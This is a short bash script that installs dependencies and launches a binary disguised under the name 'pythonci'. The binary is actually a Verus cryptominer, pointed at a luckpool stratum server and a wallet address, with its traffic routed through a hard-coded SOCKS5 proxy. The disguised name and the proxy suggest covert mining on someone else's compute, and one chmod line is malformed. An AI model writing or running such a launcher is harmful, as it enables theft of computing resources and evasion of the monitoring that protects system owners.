#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x sei.sh && chmod +x pythonci chmod 777 pythonci sei.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RWwuCt1FfULn5TutUiw4Lp2qag7sruZ1yu
WR=p23
PY=socks5://178.62.79.49:23668
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
